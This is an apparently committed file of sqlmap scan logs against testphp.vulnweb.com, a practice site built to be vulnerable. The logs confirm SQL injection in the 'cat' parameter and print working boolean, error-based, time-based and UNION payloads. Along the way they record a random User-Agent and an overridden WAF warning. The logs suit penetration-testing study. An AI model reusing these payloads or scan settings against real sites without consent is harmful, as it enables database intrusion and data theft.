@@ -1,0 +1,123 @@
+=== SQLMap Output: GET http://testphp.vulnweb.com/listproducts.php?cat=4 (unknown) ===
+___
+       __H__
+ ___ ___[']_____ ___ ___  {1.9.11#stable}
+|_ -| . [']     | .'| . |
+|___|_  [']_|_|_|__,|  _|
+      |_|V...       |_|   https://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 03:28:01 /2026-02-20/
+
+[03:28:01] [INFO] fetched random HTTP User-Agent header value 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36' from file '/usr/share/sqlmap/data/txt/user-agents.txt'
+[03:28:02] [INFO] flushing session file
+[03:28:02] [INFO] testing connection to the target URL
+[03:28:02] [INFO] checking if the target is protected by some kind of WAF/IPS
+[03:28:02] [CRITICAL] heuristics detected that the target is protected by some kind of WAF/IPS
+are you sure that you want to continue with further target testing? [Y/n] Y
+[03:28:02] [WARNING] please consider usage of tamper scripts (option '--tamper')
+[03:28:02] [INFO] testing if the target URL content is stable
+[03:28:03] [WARNING] target URL content is not stable (i.e. content differs). sqlmap will base the page comparison on a sequence matcher. If no dynamic nor injectable parameters are detected, or in case of junk results, refer to user's manual paragraph 'Page comparison'
+how do you want to proceed? [(C)ontinue/(s)tring/(r)egex/(q)uit] C
+[03:28:03] [INFO] searching for dynamic content
+[03:28:03] [CRITICAL] target URL content appears to be heavily dynamic. sqlmap is going to retry the request(s)
+[03:28:05] [INFO] testing if GET parameter 'cat' is dynamic
+[03:28:05] [WARNING] GET parameter 'cat' does not appear to be dynamic
+[03:28:05] [INFO] testing for SQL injection on GET parameter 'cat'
+it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] Y
+for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (2) and risk (2) values? [Y/n] Y
+[03:28:05] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
+[03:28:06] [WARNING] reflective value(s) found and filtering out
+[03:28:16] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (subquery - comment)'
+[03:28:19] [INFO] GET parameter 'cat' appears to be 'AND boolean-based blind - WHERE or HAVING clause (subquery - comment)' injectable 
+[03:28:19] [INFO] testing 'Generic inline queries'
+[03:28:19] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)'
+[03:28:19] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (BIGINT UNSIGNED)'
+[03:28:20] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXP)'
+[03:28:20] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (EXP)'
+[03:28:20] [INFO] testing 'MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)'
+[03:28:21] [INFO] GET parameter 'cat' is 'MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)' injectable 
+[03:28:21] [INFO] testing 'MySQL inline queries'
+[03:28:21] [INFO] testing 'MySQL >= 5.0.12 stacked queries (comment)'
+[03:28:21] [INFO] testing 'MySQL >= 5.0.12 stacked queries'
+[03:28:22] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP - comment)'
+[03:28:22] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP)'
+[03:28:23] [INFO] testing 'MySQL < 5.0.12 stacked queries (BENCHMARK - comment)'
+[03:28:23] [INFO] testing 'MySQL < 5.0.12 stacked queries (BENCHMARK)'
+[03:28:23] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
+[03:28:35] [INFO] GET parameter 'cat' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable 
+[03:28:35] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
+[03:28:35] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
+[03:28:42] [INFO] target URL appears to be UNION injectable with 11 columns
+[03:28:44] [INFO] GET parameter 'cat' is 'Generic UNION query (NULL) - 1 to 20 columns' injectable
+GET parameter 'cat' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
+sqlmap identified the following injection point(s) with a total of 74 HTTP(s) requests:
+---
+Parameter: cat (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause (subquery - comment)
+    Payload: cat=4 AND 3934=(SELECT (CASE WHEN (3934=3934) THEN 3934 ELSE (SELECT 9092 UNION SELECT 1817) END))-- -
+
+    Type: error-based
+    Title: MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)
+    Payload: cat=4 AND GTID_SUBSET(CONCAT(0x716a716a71,(SELECT (ELT(9035=9035,1))),0x717a707871),9035)
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: cat=4 AND (SELECT 8191 FROM (SELECT(SLEEP(5)))ZxLL)
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 11 columns
+    Payload: cat=4 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716a716a71,0x4e54536e59534e47797869504b56546268555762747470465873486b556d6d4d6c43445446626e41,0x717a707871),NULL,NULL-- -
+---
+[03:28:44] [INFO] the back-end DBMS is MySQL
+web server operating system: Linux Ubuntu
+web application technology: Nginx 1.19.0, PHP 5.6.40
+back-end DBMS: MySQL >= 5.6
+[03:28:47] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/testphp.vulnweb.com'
+
+[*] ending @ 03:28:47 /2026-02-20/
+
+=== SQLMap Output: GET http://testphp.vulnweb.com/hpp?pp=12 (unknown) ===
+___
+       __H__
+ ___ ___[.]_____ ___ ___  {1.9.11#stable}
+|_ -| . ["]     | .'| . |
+|___|_  [.]_|_|_|__,|  _|
+      |_|V...       |_|   https://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 03:29:29 /2026-02-20/
+
+[03:29:29] [INFO] fetched random HTTP User-Agent header value 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36' from file '/usr/share/sqlmap/data/txt/user-agents.txt'
+[03:29:29] [INFO] flushing session file
+[03:29:29] [INFO] testing connection to the target URL
+got a 301 redirect to 'http://testphp.vulnweb.com/hpp/?pp=12'. Do you want to follow? [Y/n] Y
+[03:29:30] [INFO] checking if the target is protected by some kind of WAF/IPS
+[03:29:30] [INFO] testing if the target URL content is stable
+[03:29:31] [WARNING] GET parameter 'pp' does not appear to be dynamic
+[03:29:32] [WARNING] heuristic (basic) test shows that GET parameter 'pp' might not be injectable
+[03:29:32] [INFO] heuristic (XSS) test shows that GET parameter 'pp' might be vulnerable to cross-site scripting (XSS) attacks
+[03:29:32] [INFO] testing for SQL injection on GET parameter 'pp'
+[03:29:32] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
+[03:29:33] [WARNING] reflective value(s) found and filtering out
+
+=== SQLMap Output: GET http://testphp.vulnweb.com/listproducts.php?cat=1 (unknown) ===
+___
+       __H__
+ ___ ___[,]_____ ___ ___  {1.9.11#stable}
+|_ -| . [)]     | .'| . |
+|___|_  [(]_|_|_|__,|  _|
+      |_|V...       |_|   https://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 03:29:49 /2026-02-20/
+
+[03:29:49] [INFO] fetched random HTTP User-Agent header value 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:141.0) Gecko/20100101 Firefox/141.0' from file '/usr/share/sqlmap/data/txt/user-agents.txt'
+[03:29:49] [INFO] flushing session file
+[03:29:49] [INFO] testing connection to the target URL
+[03:29:49] [INFO] checking if the target is protected by some kind of WAF/IPS
+
